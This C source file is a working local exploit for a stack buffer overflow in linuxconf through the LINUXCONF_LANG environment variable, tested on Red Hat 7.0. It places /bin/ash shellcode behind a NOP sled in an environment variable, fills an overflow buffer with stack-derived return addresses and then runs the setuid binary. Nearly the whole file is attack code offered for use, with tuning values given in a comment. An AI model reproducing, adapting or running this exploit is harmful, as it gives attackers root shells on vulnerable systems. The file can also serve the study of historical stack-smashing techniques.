/*
 * This is an exploit for the linuxconf overflow issue.
 *
 * The detail of this hole was published on 08.28.2002 by
 * David Endler from www.idefense.com. 
 *
 * Tested to work on Redhat 7.0 with linuxconf 1.25r3.
 * [The magic numbers that worked for me are: 980 500 2048 1]
 *
 * This is a classical example of stack smashing. Large portion 
 * of code were ripped from Aleph1's. So, credits due to him.
 *
 * Flame or comment goes to: jinyean@hotmail.com 
 *
 */

#include <stdlib.h>
#include <unistd.h>

#define DEFAULT_ALIGN		0
#define DEFAULT_OFFSET		0
#define DEFAULT_BUFFER_SIZE	980
#define DEFAULT_EGG_SIZE	2048
#define NOP			0x90

char shellcode[]=
        "\xeb\x1f\x5e\x89\x76\x09\x31\xc0\x88\x46\x08\x89"
        "\x46\x0d\xb0\x0b\x89\xf3\x8d\x4e\x09\x8d\x56\x0d"
        "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff"
        "\xff\xff/bin/ash";


unsigned long get_esp(void) {
	__asm__("movl %esp,%eax");
}

main(int argc, char *argv[]) {
	char *buff, *ptr, *egg;
	long *addr_ptr, addr;
	int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
	int i, eggsize=DEFAULT_EGG_SIZE, align=DEFAULT_ALIGN;

	if (argc>1) bsize=atoi(argv[1]);
	if (argc>2) offset=atoi(argv[2]);
	if (argc>3) eggsize=atoi(argv[3]);
	if (argc>4) align=atoi(argv[4]);

	if (!(buff=malloc(bsize))) {
		printf("Can't allocate memory.\n");
		exit(0);
	}
	if (!(egg=malloc(eggsize))) {
		printf("Can't allocate memory.\n");
	        exit(0);
	}

	addr=get_esp()-offset;
	printf("Using address: 0x%x\n",addr);

        ptr=buff;
	addr_ptr=(long *)(ptr+align);

	for (i=0; i<bsize; i+=4) 
		*(addr_ptr++)=addr;

	ptr=egg;

	for (i=0; i<eggsize-strlen(shellcode)-1; i++)
		*(ptr++)=NOP;

	for (i=0; i<strlen(shellcode); i++)
		*(ptr++)=shellcode[i];

	buff[bsize-1]='\0';
	egg[eggsize-1]='\0';

	memcpy(egg,"EGG=",4);
	putenv(egg);
	memcpy(buff,"LINUXCONF_LANG=",15);
	putenv(buff);
	execl("/sbin/linuxconf","linuxconf",NULL);

}
